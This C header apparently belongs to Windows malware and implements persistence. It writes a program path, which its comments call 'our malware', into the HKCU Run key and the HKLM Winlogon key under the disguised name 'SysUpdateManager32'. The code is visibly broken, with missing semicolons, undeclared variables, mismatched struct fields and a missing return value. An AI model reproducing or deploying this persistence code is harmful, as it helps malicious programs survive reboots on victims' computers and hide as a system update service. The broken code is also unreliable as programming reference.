#ifndef PERS_H
#define PERS_H

#include <windows.h>
#include <stdlib.h>
#include "helper.h" 

#define PERS_NAME "SysUpdateManager32"

struct _PERS_CONTEXT {
    char *regKey;
    char *valueName;
    char *valueData;
    DWORD *valueDataLen;
    DWORD valueType;
    char *targetPath;
    DWORD targetPathLen;
} PERS_CONTEXT, *PPERS_CONTEXT;

int GetRegName()

BOOL ModifyRegistry(PPERS_CONTEXT pPc) {
    char PERS_NAME[64];
    HKEY hKey = NULL;
    LONG rc;

    rc = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) pPc->regKey, 0, KEY_WRITE, &hKey);
    if (rc != ERROR_SUCCESS) {
        TranslateErrorPrint(GetLastError());
        return FALSE;
    }

    rc = RegSetValueEx(hKey, (LPCSTR) pPc->regName, 0, pPc->dwType, (unsigned char*) pPc->regValue, *(pPc->regValueLen));
    if (rc != ERROR_SUCCESS) {
        TranslateErrorPrint(GetLastError());
        RegCloseKey(hKey);
        return FALSE;
    }

    printf("[+] Registry value successfully set\n")
}

BOOL InjectRunRegistry(PPERS_CONTEXT pPc) {
	HKEY hKey = NULL;
	const char *REG = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    pPc->regKey = REG;
    pPc->regValue = pPc->targetPath;
    pPc->regValueLen = &(pPc->targetPathLen);
    pPc->dwType = REG_SZ;

	// Get our handle to the registry
	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
	if (result != ERROR_SUCCESS) {
        TranslateErrorPrint(GetLastError());
		return FALSE;
	}

	// Add to the registry key, the path to our malware
	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
	if (result != ERROR_SUCCESS) {
        TranslateErrorPrint(GetLastError());
		RegCloseKey(hKey);
		return FALSE;
	}

	printf("[+] Run registry key set for: %s\n", malwareFull);
	return TRUE;
}

BOOL InjectWinlogonRegistry(const char *malwareFull, int malwareFullLen) {
	HKEY hKey = NULL;
	const char *REG = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";

	// Get our handle to the registry
	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while opening the Winlogon registry key: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	// Add to the registry key, the path to our malware
	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while setting registry key: %s\n", errMsg);
		LocalFree(errMsg);
		RegCloseKey(hKey);
		return FALSE;
	}

	printf("Winlogon registry key set for: %s\n", malwareFull);
	return TRUE;
}

#endif // PERSH_H

